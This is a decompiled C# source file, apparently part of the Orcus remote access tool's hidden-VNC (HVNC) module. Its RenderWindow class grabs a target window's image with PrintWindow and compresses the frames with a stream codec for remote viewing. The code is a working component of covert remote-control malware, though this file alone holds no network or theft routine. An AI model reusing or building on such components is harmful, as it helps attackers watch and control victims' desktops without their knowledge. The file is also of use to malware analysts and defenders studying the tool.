using System;
using System.Drawing;
using System.Drawing.Imaging;
using Orcus.Native;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Data;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.HVNC;

public class RenderWindow : IDisposable
{
	private int _codecHeight;

	private int _codecWidth;

	private UnsafeStreamCodec _unsafeStreamCodec;

	public WindowInformation WindowInformation { get; }

	public IntPtr Handle { get; }

	public RenderWindow(WindowInformation windowInformation, IntPtr handle)
	{
		WindowInformation = windowInformation;
		Handle = handle;
	}

	public void Dispose()
	{
		UnsafeStreamCodec unsafeStreamCodec = _unsafeStreamCodec;
		if (unsafeStreamCodec != null)
		{
			unsafeStreamCodec.Dispose();
		}
	}

	public void ApplyWindowInformation(WindowInformation windowInformation)
	{
		WindowInformation.set_Title(windowInformation.get_Title());
		WindowInformation.set_Width(windowInformation.get_Width());
		WindowInformation.set_Height(windowInformation.get_Height());
		WindowInformation.set_X(windowInformation.get_X());
		WindowInformation.set_Y(windowInformation.get_Y());
	}

	public IDataInfo Render()
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		if (NativeMethods.GetWindowRect(Handle, out var lpRect) && lpRect.Width != 0 && lpRect.Height != 0)
		{
			if (_unsafeStreamCodec == null || _codecWidth != lpRect.Width || _codecHeight != lpRect.Height)
			{
				UnsafeStreamCodec unsafeStreamCodec = _unsafeStreamCodec;
				if (unsafeStreamCodec != null)
				{
					unsafeStreamCodec.Dispose();
				}
				_unsafeStreamCodec = new UnsafeStreamCodec((UnsafeStreamCodecParameters)0);
				_codecWidth = lpRect.Width;
				_codecHeight = lpRect.Height;
			}
			Bitmap val = new Bitmap(lpRect.Width, lpRect.Height, (PixelFormat)925707);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					IntPtr hdc = val2.GetHdc();
					try
					{
						if (!NativeMethods.PrintWindow(Handle, hdc, 0u))
						{
							return null;
						}
					}
					finally
					{
						val2.ReleaseHdc(hdc);
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				BitmapData val3 = val.LockBits(new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height()), (ImageLockMode)3, ((Image)val).get_PixelFormat());
				try
				{
					return (IDataInfo)(object)_unsafeStreamCodec.CodeImage(val3.get_Scan0(), new Rectangle(new Point(0, 0), ((Image)val).get_Size()), ((Image)val).get_Size(), ((Image)val).get_PixelFormat());
				}
				catch (Exception)
				{
					return null;
				}
				finally
				{
					val.UnlockBits(val3);
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		return null;
	}
}
